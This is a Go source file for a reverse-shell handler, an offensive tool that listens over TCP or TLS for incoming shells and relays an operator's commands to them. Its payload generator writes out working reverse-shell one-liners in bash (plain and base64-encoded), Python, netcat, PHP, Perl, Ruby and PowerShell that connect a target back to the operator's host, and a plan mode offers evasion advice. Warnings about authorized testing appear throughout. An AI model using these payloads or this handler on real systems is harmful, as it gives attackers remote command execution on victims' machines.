// Package main implements a Reverse Shell Handler for security testing.
// Converted from Python to Go - reverse-shell-handler tool
//
// WARNING: This tool is intended for authorized security assessments only.
// Unauthorized access to computer systems is illegal.
//
// Build: go build -o reverse-shell-handler handler.go
// Usage: ./reverse-shell-handler --plan
//        ./reverse-shell-handler -l 4444
//        ./reverse-shell-handler -l 443 --ssl
//        ./reverse-shell-handler --payloads -H 10.0.0.1 -l 4444
package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

// =============================================================================
// Configuration and Constants
// =============================================================================

const (
	DefaultPort    = 4444
	DefaultTimeout = 300 // 5 minutes
	RecvSize       = 4096
)

// ShellType represents supported shell types
type ShellType string

const (
	ShellTypeRAW ShellType = "raw"
	ShellTypeTTY ShellType = "tty"
	ShellTypeHTTP ShellType = "http"
)

// =============================================================================
// Data Structures
// =============================================================================

// Session represents an active shell session
type Session struct {
	ID          int       `json:"id"`
	Conn        net.Conn  `json:"-"`
	Address     string    `json:"address"`
	ConnectedAt time.Time `json:"connected_at"`
	Active      bool      `json:"active"`
	SSLEnabled  bool      `json:"ssl_enabled"`
	History     []string  `json:"-"`
}

// ToDict converts session to JSON-serializable format
func (s *Session) ToDict() map[string]interface{} {
	return map[string]interface{}{
		"id":           s.ID,
		"address":      s.Address,
		"connected_at": s.ConnectedAt.Format(time.RFC3339),
		"active":       s.Active,
		"ssl_enabled":  s.SSLEnabled,
	}
}

// HandlerConfig holds configuration for shell handler
type HandlerConfig struct {
	Host         string
	Port         int
	ShellType    ShellType
	SSLEnabled   bool
	SSLCert      string
	SSLKey       string
	Timeout      int
	MultiHandler bool
	Verbose      bool
	PlanMode     bool
	ShowPayloads bool
}

// =============================================================================
// Payload Generation
// =============================================================================

// PayloadGenerator generates reverse shell payloads for various platforms
type PayloadGenerator struct{}

// Bash generates Bash reverse shell payload
func (p *PayloadGenerator) Bash(host string, port int) string {
	return fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", host, port)
}

// BashBase64 generates base64-encoded Bash payload
func (p *PayloadGenerator) BashBase64(host string, port int) string {
	payload := p.Bash(host, port)
	encoded := base64.StdEncoding.EncodeToString([]byte(payload))
	return fmt.Sprintf("echo %s | base64 -d | bash", encoded)
}

// Python generates Python reverse shell payload
func (p *PayloadGenerator) Python(host string, port int) string {
	return fmt.Sprintf(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, host, port)
}

// Netcat generates Netcat reverse shell payload
func (p *PayloadGenerator) Netcat(host string, port int) string {
	return fmt.Sprintf("nc -e /bin/sh %s %d", host, port)
}

// NetcatNoE generates Netcat reverse shell without -e flag
func (p *PayloadGenerator) NetcatNoE(host string, port int) string {
	return fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f", host, port)
}

// PHP generates PHP reverse shell payload
func (p *PayloadGenerator) PHP(host string, port int) string {
	return fmt.Sprintf(`php -r '$sock=fsockopen("%s",%d);exec("/bin/sh -i <&3 >&3 2>&3");'`, host, port)
}

// Perl generates Perl reverse shell payload
func (p *PayloadGenerator) Perl(host string, port int) string {
	return fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, host, port)
}

// Ruby generates Ruby reverse shell payload
func (p *PayloadGenerator) Ruby(host string, port int) string {
	return fmt.Sprintf(`ruby -rsocket -e'f=TCPSocket.open("%s",%d).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'`, host, port)
}

// PowerShell generates PowerShell reverse shell payload
func (p *PayloadGenerator) PowerShell(host string, port int) string {
	return fmt.Sprintf(`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`, host, port)
}

// GetAll returns all payload types
func (p *PayloadGenerator) GetAll(host string, port int) map[string]string {
	return map[string]string{
		"bash":        p.Bash(host, port),
		"bash_b64":    p.BashBase64(host, port),
		"python":      p.Python(host, port),
		"netcat":      p.Netcat(host, port),
		"netcat_no_e": p.NetcatNoE(host, port),
		"php":         p.PHP(host, port),
		"perl":        p.Perl(host, port),
		"ruby":        p.Ruby(host, port),
		"powershell":  p.PowerShell(host, port),
	}
}

// =============================================================================
// Shell Handler Core
// =============================================================================

// ShellHandler manages shell connections
type ShellHandler struct {
	Config         *HandlerConfig
	Sessions       map[int]*Session
	sessionCounter int
	listener       net.Listener
	stopEvent      chan struct{}
	mu             sync.Mutex
	currentSession *Session
}

// NewShellHandler creates a new shell handler
func NewShellHandler(config *HandlerConfig) *ShellHandler {
	return &ShellHandler{
		Config:    config,
		Sessions:  make(map[int]*Session),
		stopEvent: make(chan struct{}),
	}
}

// setupListener creates and configures the server listener
func (h *ShellHandler) setupListener() (net.Listener, error) {
	addr := fmt.Sprintf("%s:%d", h.Config.Host, h.Config.Port)

	if h.Config.SSLEnabled {
		// Load TLS configuration
		cert, err := tls.LoadX509KeyPair(h.Config.SSLCert, h.Config.SSLKey)
		if err != nil {
			return nil, fmt.Errorf("failed to load TLS certificates: %v", err)
		}

		tlsConfig := &tls.Config{
			Certificates: []tls.Certificate{cert},
		}

		return tls.Listen("tcp", addr, tlsConfig)
	}

	return net.Listen("tcp", addr)
}

// acceptConnection accepts incoming connection
func (h *ShellHandler) acceptConnection() *Session {
	// Set deadline for accept to allow periodic stop checks
	if tcpListener, ok := h.listener.(*net.TCPListener); ok {
		tcpListener.SetDeadline(time.Now().Add(1 * time.Second))
	}

	conn, err := h.listener.Accept()
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			return nil
		}
		if h.Config.Verbose {
			fmt.Printf("[!] Accept error: %v\n", err)
		}
		return nil
	}

	// Set connection timeout
	conn.SetDeadline(time.Now().Add(time.Duration(h.Config.Timeout) * time.Second))

	h.mu.Lock()
	h.sessionCounter++
	session := &Session{
		ID:          h.sessionCounter,
		Conn:        conn,
		Address:     conn.RemoteAddr().String(),
		ConnectedAt: time.Now(),
		Active:      true,
		SSLEnabled:  h.Config.SSLEnabled,
		History:     make([]string, 0),
	}
	h.Sessions[session.ID] = session
	h.mu.Unlock()

	return session
}

// interact handles interactive shell session
func (h *ShellHandler) interact(session *Session) {
	fmt.Printf("\n[*] Interacting with session %d (%s)\n", session.ID, session.Address)
	fmt.Println("[*] Type 'background' to return to handler, 'exit' to close session")
	fmt.Println()

	// Create channels for data
	done := make(chan struct{})
	stdin := make(chan string)

	// Read from stdin in goroutine
	go func() {
		reader := bufio.NewReader(os.Stdin)
		for {
			select {
			case <-done:
				return
			default:
				line, err := reader.ReadString('\n')
				if err != nil {
					return
				}
				stdin <- line
			}
		}
	}()

	// Read from socket in goroutine
	go func() {
		buf := make([]byte, RecvSize)
		for session.Active {
			select {
			case <-done:
				return
			default:
				session.Conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
				n, err := session.Conn.Read(buf)
				if err != nil {
					if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
						continue
					}
					if err != io.EOF {
						continue
					}
					fmt.Println("\n[!] Connection closed by remote")
					session.Active = false
					close(done)
					return
				}
				if n > 0 {
					fmt.Print(string(buf[:n]))
				}
			}
		}
	}()

	// Main interaction loop
	for session.Active {
		select {
		case <-h.stopEvent:
			close(done)
			return
		case <-done:
			return
		case command := <-stdin:
			cmd := strings.TrimSpace(command)

			if strings.ToLower(cmd) == "background" {
				fmt.Println("\n[*] Session backgrounded")
				close(done)
				return
			}

			if strings.ToLower(cmd) == "exit" {
				fmt.Println("\n[*] Closing session")
				session.Active = false
				close(done)
				break
			}

			_, err := session.Conn.Write([]byte(command))
			if err != nil {
				fmt.Printf("\n[!] Send error: %v\n", err)
				session.Active = false
				close(done)
				break
			}
			session.History = append(session.History, cmd)
		}
	}

	if !session.Active {
		h.closeSession(session)
	}
}

// closeSession closes a session
func (h *ShellHandler) closeSession(session *Session) {
	session.Active = false
	if session.Conn != nil {
		session.Conn.Close()
	}

	h.mu.Lock()
	delete(h.Sessions, session.ID)
	h.mu.Unlock()

	if h.Config.Verbose {
		fmt.Printf("[*] Session %d closed\n", session.ID)
	}
}

// Start starts the shell handler
func (h *ShellHandler) Start() error {
	var err error
	h.listener, err = h.setupListener()
	if err != nil {
		return err
	}

	sslStr := ""
	if h.Config.SSLEnabled {
		sslStr = " (SSL)"
	}
	fmt.Printf("[*] Handler listening on %s:%d%s\n", h.Config.Host, h.Config.Port, sslStr)
	fmt.Println("[*] Waiting for connection...")
	fmt.Println("[*] Press Ctrl+C to stop handler")
	fmt.Println()

	for {
		select {
		case <-h.stopEvent:
			return nil
		default:
			session := h.acceptConnection()
			if session != nil {
				fmt.Printf("\n[+] Connection from %s\n", session.Address)
				fmt.Printf("[+] Session ID: %d\n", session.ID)

				if h.Config.MultiHandler {
					fmt.Println("[*] Use 'sessions' to list, 'interact <id>' to connect")
				} else {
					h.interact(session)
				}
			}
		}
	}
}

// Stop stops the handler and closes all sessions
func (h *ShellHandler) Stop() {
	close(h.stopEvent)

	// Close all sessions
	h.mu.Lock()
	for _, session := range h.Sessions {
		h.closeSession(session)
	}
	h.mu.Unlock()

	// Close listener
	if h.listener != nil {
		h.listener.Close()
	}

	fmt.Println("[*] Handler stopped")
}

// ListSessions returns list of active sessions
func (h *ShellHandler) ListSessions() []*Session {
	h.mu.Lock()
	defer h.mu.Unlock()

	var sessions []*Session
	for _, s := range h.Sessions {
		if s.Active {
			sessions = append(sessions, s)
		}
	}
	return sessions
}

// InteractSession interacts with a specific session
func (h *ShellHandler) InteractSession(sessionID int) bool {
	h.mu.Lock()
	session, ok := h.Sessions[sessionID]
	h.mu.Unlock()

	if ok && session.Active {
		h.interact(session)
		return true
	}
	return false
}

// =============================================================================
// Planning Mode
// =============================================================================

// printPlan displays execution plan without performing actions
func printPlan(config *HandlerConfig) {
	fmt.Println(`
[PLAN MODE] Tool: reverse-shell-handler
================================================================================
`)

	fmt.Println("HANDLER CONFIGURATION")
	fmt.Println(strings.Repeat("-", 40))
	fmt.Printf("  Listen Address:  %s\n", config.Host)
	fmt.Printf("  Listen Port:     %d\n", config.Port)
	fmt.Printf("  Shell Type:      %s\n", config.ShellType)
	fmt.Printf("  SSL Enabled:     %t\n", config.SSLEnabled)
	fmt.Printf("  Multi-Handler:   %t\n", config.MultiHandler)
	fmt.Printf("  Timeout:         %ds\n", config.Timeout)
	fmt.Println()

	fmt.Println("ACTIONS TO BE PERFORMED")
	fmt.Println(strings.Repeat("-", 40))
	fmt.Printf("  1. Create TCP socket and bind to %s:%d\n", config.Host, config.Port)
	if config.SSLEnabled {
		fmt.Println("  2. Wrap socket with SSL/TLS")
	}
	fmt.Println("  3. Listen for incoming connections")
	fmt.Println("  4. Accept connection and create session")
	fmt.Println("  5. Provide interactive shell access")
	fmt.Println()

	fmt.Println("AVAILABLE PAYLOADS")
	fmt.Println(strings.Repeat("-", 40))
	fmt.Println("  Execute with: --payloads flag")
	fmt.Println("  - bash: Standard bash reverse shell")
	fmt.Println("  - python: Python one-liner")
	fmt.Println("  - netcat: Netcat with -e flag")
	fmt.Println("  - php: PHP reverse shell")
	fmt.Println("  - powershell: PowerShell one-liner")
	fmt.Println()

	fmt.Println("RISK ASSESSMENT")
	fmt.Println(strings.Repeat("-", 40))
	fmt.Println("  Risk Level: HIGH")
	fmt.Println("    - Opens listening port on system")
	fmt.Println("    - Receives arbitrary code execution")
	fmt.Println("    - All traffic is logged/visible")
	fmt.Println()

	fmt.Println("DETECTION VECTORS")
	fmt.Println(strings.Repeat("-", 40))
	fmt.Println("  - Network monitoring will detect listener")
	fmt.Println("  - Firewall may block incoming connections")
	fmt.Println("  - Process list shows Go listener")
	fmt.Println("  - Shell commands executed on target logged")
	fmt.Println()

	fmt.Println("OPSEC CONSIDERATIONS")
	fmt.Println(strings.Repeat("-", 40))
	fmt.Println("  - Consider using SSL for encrypted traffic")
	fmt.Println("  - Use non-standard ports if possible")
	fmt.Println("  - Session data kept in-memory only")
	fmt.Println()

	fmt.Println(strings.Repeat("=", 80))
	fmt.Println("No actions will be taken. Remove --plan flag to execute.")
	fmt.Println(strings.Repeat("=", 80))
}

// printPayloads prints available payloads
func printPayloads(host string, port int) {
	gen := &PayloadGenerator{}
	payloads := gen.GetAll(host, port)

	fmt.Printf(`
[*] Reverse Shell Payloads for %s:%d
================================================================================
`, host, port)

	for name, payload := range payloads {
		fmt.Printf("[%s]\n", strings.ToUpper(name))
		fmt.Println(strings.Repeat("-", 60))
		fmt.Println(payload)
		fmt.Println()
	}
}

// =============================================================================
// CLI Interface
// =============================================================================

func main() {
	// Command line flags
	host := flag.String("H", "0.0.0.0", "Listen address")
	port := flag.Int("l", DefaultPort, "Listen port")
	ssl := flag.Bool("ssl", false, "Enable SSL/TLS encryption")
	sslCert := flag.String("ssl-cert", "", "SSL certificate file")
	sslKey := flag.String("ssl-key", "", "SSL private key file")
	multi := flag.Bool("m", false, "Multi-handler mode (manage multiple sessions)")
	timeout := flag.Int("t", DefaultTimeout, "Session timeout in seconds")
	payloads := flag.Bool("payloads", false, "Show reverse shell payloads")
	planMode := flag.Bool("plan", false, "Show execution plan without starting handler")
	verbose := flag.Bool("v", false, "Enable verbose output")

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, `Reverse Shell Handler - Multi-Protocol Shell Listener

Usage: %s [options]

Examples:
  %s --plan
  %s -l 4444
  %s -l 443 --ssl --ssl-cert cert.pem --ssl-key key.pem
  %s --payloads -H 10.0.0.1 -l 4444

WARNING: Use only for authorized security testing.

Options:
`, os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0])
		flag.PrintDefaults()
	}

	flag.Parse()

	// Build configuration
	config := &HandlerConfig{
		Host:         *host,
		Port:         *port,
		ShellType:    ShellTypeRAW,
		SSLEnabled:   *ssl,
		SSLCert:      *sslCert,
		SSLKey:       *sslKey,
		Timeout:      *timeout,
		MultiHandler: *multi,
		Verbose:      *verbose,
		PlanMode:     *planMode,
		ShowPayloads: *payloads,
	}

	// Show payloads
	if config.ShowPayloads {
		callbackHost := *host
		if callbackHost == "0.0.0.0" {
			callbackHost = "YOUR_IP"
		}
		printPayloads(callbackHost, *port)
		os.Exit(0)
	}

	// Planning mode
	if config.PlanMode {
		printPlan(config)
		os.Exit(0)
	}

	// Start handler
	fmt.Println(`
================================================================================
  REVERSE SHELL HANDLER
================================================================================
  WARNING: This tool is for AUTHORIZED security testing only.
  Unauthorized access to computer systems is ILLEGAL.
================================================================================
`)

	handler := NewShellHandler(config)

	// Handle interrupt
	// Note: In production, would add signal handling here

	err := handler.Start()
	if err != nil {
		fmt.Printf("[!] Error: %v\n", err)
		os.Exit(1)
	}

	os.Exit(0)
}

// Helper for JSON output (not used in CLI but available for programmatic use)
func sessionsToJSON(sessions []*Session) string {
	var sessionDicts []map[string]interface{}
	for _, s := range sessions {
		sessionDicts = append(sessionDicts, s.ToDict())
	}
	data, _ := json.MarshalIndent(sessionDicts, "", "  ")
	return string(data)
}
